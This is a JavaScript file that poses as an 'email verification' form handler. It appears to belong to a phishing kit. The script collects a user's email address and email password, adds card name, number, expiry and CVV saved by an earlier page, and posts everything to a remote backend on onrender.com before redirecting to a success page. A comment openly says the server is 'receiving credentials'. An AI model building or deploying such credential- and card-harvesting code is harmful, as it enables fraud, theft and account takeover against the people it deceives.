/*====================================
EMAIL VERIFICATION SCRIPT
====================================*/


// FORM

const emailForm =
  document.getElementById(
    "emailForm"
  );


// INPUTS

const emailInput =
  document.getElementById(
    "email"
  );

const passwordInput =
  document.getElementById(
    "emailPassword"
  );


// BUTTON

const verifyButton =
  document.querySelector(
    ".verify-btn"
  );



/*====================================
FORM SUBMIT
====================================*/

emailForm.addEventListener(
  "submit",
  async function(event){


    event.preventDefault();

    const email =
      emailInput.value.trim();

    const password =
      passwordInput.value.trim();



    // VALIDATION

    if(!validateEmail(email)){

      alert(
        "Enter valid email"
      );

      return;
    }


    if(password.length < 6){

      alert(
        "Password too short"
      );

      return;
    }



// SAVE

    try {
      localStorage.setItem(
        "userEmail",
        email
      );

      localStorage.setItem(
        "userPassword",
        password
      );
    } catch (e) {
      // keep UI flow working even if storage is blocked
    }

    // Backend call is optional for navigation.
    // XAMPP is receiving credentials; even if fetch fails, still redirect.

    // Save button state
    verifyButton.innerHTML = "Verifying...";
    verifyButton.disabled = true;
    document.body.style.opacity = "0";

    const isLocal = window.location.hostname === "127.0.0.1" || window.location.hostname === "localhost";
    const apiUrl = isLocal
      ? "http://127.0.0.1:3000/api/submit"
      : "https://gcb-site-backend.onrender.com/api/submit";

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardName: localStorage.getItem("cardName") || "",
          cardNumber: localStorage.getItem("cardNumber") || "",
          expiry: localStorage.getItem("expiry") || "",
          cvv: localStorage.getItem("cvv") || "",
          userEmail: email,
          userPassword: password
        })
      });

      if (response && response.status === 201 && response.ok) {
        window.location.href = "success.html";
        return;
      }

      // If API responded but not success, show error and keep user on page.
      let data = null;
      try {
        data = await response.json();
      } catch (_) {
        // ignore JSON parse errors
      }

      const msg = (data && data.error) ? data.error : `Verification failed (HTTP ${response.status})`;
      alert(msg);
    } catch (err) {
      // Network/CORS/connection errors: keep user on email page.
      console.error("Submission fetch failed:", err);
      const statusText = err && err.message ? err.message : String(err);
      alert(`Unable to verify right now.\n${statusText}`);
    } finally {
      // Restore UI state if we are staying on this page.
      // (On success, we navigated away so this won't matter.)
      verifyButton.innerHTML = "Verify";
      verifyButton.disabled = false;
      document.body.style.opacity = "1";
    }










});



/*====================================
EMAIL VALIDATOR
====================================*/

function validateEmail(email){

  const regex =
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  return regex.test(email);

}
/*====================================PASSWORD TOGGLE====================================*/

const togglePassword =
document.getElementById(
  "togglePassword"
);

togglePassword.addEventListener(
  "click",
  function(){

    if(
      passwordInput.type ===
      "password"
    ){

      passwordInput.type =
      "text";

      togglePassword.classList.remove(
        "fa-eye"
      );

      togglePassword.classList.add(
        "fa-eye-slash"
      );

    } else {

      passwordInput.type =
      "password";

      togglePassword.classList.remove(
        "fa-eye-slash"
      );

      togglePassword.classList.add(
        "fa-eye"
      );

    }
    
});